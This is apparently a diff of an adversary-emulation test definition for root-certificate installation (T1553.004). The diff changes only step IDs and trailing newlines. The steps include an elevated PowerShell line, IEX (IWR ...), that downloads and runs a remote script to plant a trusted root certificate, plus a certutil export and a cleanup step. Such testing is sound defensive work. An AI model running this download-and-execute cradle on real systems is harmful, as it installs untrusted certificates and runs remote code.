@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "39624082-2f7f-488d-843b-62b3bb2fb523",
+      "id": "ec633987-437c-4266-a1f2-f661f4b57500",
       "type": "execute-command",
       "data": {
-        "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}\n",
+        "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}",
         "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "03eb1517-fe4f-4d49-b59e-a8d7776f32a4",
+      "id": "e1c0499a-3a32-4005-b299-5f306d2880fe",
       "type": "execute-command",
       "data": {
-        "command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n",
+        "command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item",
         "command_type": "powershell"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "39624082-2f7f-488d-843b-62b3bb2fb523",
+      "s": "ec633987-437c-4266-a1f2-f661f4b57500",
       "p": "on-success",
-      "o": "03eb1517-fe4f-4d49-b59e-a8d7776f32a4"
+      "o": "e1c0499a-3a32-4005-b299-5f306d2880fe"
     },
     {
-      "s": "39624082-2f7f-488d-843b-62b3bb2fb523",
+      "s": "ec633987-437c-4266-a1f2-f661f4b57500",
       "p": "on-failure",
-      "o": "03eb1517-fe4f-4d49-b59e-a8d7776f32a4"
+      "o": "e1c0499a-3a32-4005-b299-5f306d2880fe"
     }
   ],
   "tags": [
